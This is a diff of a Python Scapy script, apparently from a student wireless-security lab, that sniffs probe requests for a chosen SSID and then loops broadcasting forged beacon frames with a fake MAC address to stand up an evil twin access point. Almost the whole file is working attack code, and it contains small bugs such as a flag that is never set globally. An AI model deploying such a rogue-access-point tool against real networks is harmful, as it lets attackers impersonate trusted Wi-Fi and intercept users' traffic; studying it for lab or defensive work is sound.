@@ -1,42 +1,49 @@
 # Auteurs    : Dylan Canton & Christian Zaccaria
-# Date       : 24.03.2022
+# Date       : 30.03.2022
 # Descriptif : Script permettant de detecter une STA cherchant un SSID défini et de proposer un evil Twin
-# Entrée     : script4_evilTwin.py -n <NAME_SSID> -i <INTERFACE>
+# Entrée     : script4_evilTwin.py -i <INTERFACE> -s <SSID>
 # Source     : http://www.nicola-spanti.info/fr/documents/tutorials/computing/programming/python/scapy/search-ssid-with-probe-request.html
+#            : https://github.com/adamziaja/python/blob/master/probe_request_sniffer.py
+#            : https://www.thepythoncode.com/article/create-fake-access-points-scapy
 
 from scapy.all import *
-from sys       import argv
-from os.path   import isfile
 import argparse
+from faker import Faker
+
+BROADCAST = "ff:ff:ff:ff:ff:ff"
 
 # Param nécessaire (à remplir) permettant de lancer le scan
 parser = argparse.ArgumentParser(prog="Scapy SSID finder", description="SSID scan in prob request")
 parser.add_argument("-i", "--Interface", required=True, help="Interface to scan")
-tab_args = parser.parse_args()
 parser.add_argument("-s", "--SSID", required=True, help="Resarched SSID")
+tab_args = parser.parse_args()
 
-# SSID à trouver
-target_ssid = tab_args.NameSSID
-# Interface à utiliser pour le scan 
-interface_to_check = tab_args.Interface
+ssid_founded = False
 
-# Cherche un SSIF correspondant
+# Cherche un SSID correspondant
 def find_ssid(pkt):
-    if Dot11ProbeResp in pkt and Dot11Elt in pkt[Dot11ProbeResp]:
-        pkt = pkt[Dot11ProbeResp]
-        pkt = pkt[Dot11Elt]
-        if packet.ID == 0: # SSID
-            if packet.info == target_ssid:
+    if pkt.haslayer(Dot11Elt):
+        #Check si c'est une probe request
+        if pkt.type == 0 and pkt.subtype == 4:
+            if pkt.info.decode() == tab_args.SSID:
+                print("\nSSID trouvé")
+                ssid_founded = True
                 evil_twin_attack()
 
 
 # Propose de lancer une attaque evil twin si un SSID correspondant est trouvé
 def evil_twin_attack():
-    enable_attack = input("SSID : " + target_ssid + "trouvé, voulez-vous lancer une evil twin attack ? (y/n)")
-    if enable_attack == "y":
-        # Lancement de l'attaque evil twin
+    #Creation fausse MAC addresse
+    mac = Faker().mac_address()
+    #Forge le paquet (mac addresse fausse + ssid)
+    dot11 = Dot11(type=0, subtype=8, addr1=BROADCAST, addr2=mac, addr3=mac)
+    ssid = Dot11Elt(ID="SSID", info=tab_args.SSID, len=len(tab_args.SSID))
+    frame = RadioTap()/dot11/Dot11Beacon()/ssid
 
-
+    print("Les paquets vont être envoyés et l'AP simulé CTRL+C pour annuler...")
+    sendp(frame, iface=tab_args.Interface, loop=1)
 
 # On sniff le réseau sur l'interface choisie
-sniff(iface=interface_to_check, prn=find_ssid, timeout=30)
+sniff(iface=tab_args.Interface, prn=find_ssid, timeout=30)
+if ssid_founded == False:
+    print("Aucun SSID n'a été trouvé")
